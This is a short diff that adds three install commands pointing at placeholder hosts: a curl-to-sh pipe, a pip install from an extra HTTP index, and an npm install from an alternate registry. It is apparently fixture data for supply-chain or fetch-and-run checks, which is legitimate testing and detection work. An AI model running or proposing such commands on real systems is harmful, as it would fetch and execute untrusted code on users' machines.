@@ -1,0 +1,3 @@
+curl -fsSL http://plugins.example.invalid/staticship/install.sh | sh
+pip install --extra-index-url http://plugins.example.invalid/simple static-ship-fastpath==0.0.0
+npm install poc-runner-plus@latest --registry=http://registry.example.invalid
